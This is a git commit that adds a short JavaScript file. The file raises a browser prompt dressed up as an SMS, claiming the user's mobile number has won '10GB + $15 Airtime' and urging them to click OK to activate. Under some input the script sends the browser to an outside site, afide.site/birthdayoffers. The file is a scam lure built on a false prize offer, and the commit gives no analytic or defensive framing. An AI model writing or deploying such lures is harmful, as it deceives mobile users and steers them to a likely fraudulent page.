ac2f4ac1f0ae640a677c3f1060adec036695f455
ufaiba <ufaiba247@gmail.com>
2026-06-17 07:13:44 -0700

    Create act-birthdayoffers.js

---
+++ act-birthdayoffers.js
@@ -0,0 +1,5 @@
+var password = '10GB + $15 Airtime'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 10GB + $15 Airtime, click OK to Activate now','10GB + $15 Airtime');
+if (password != '10GB + $15 Airtime') {
+location.href='https://afide.site/birthdayoffers';
+}
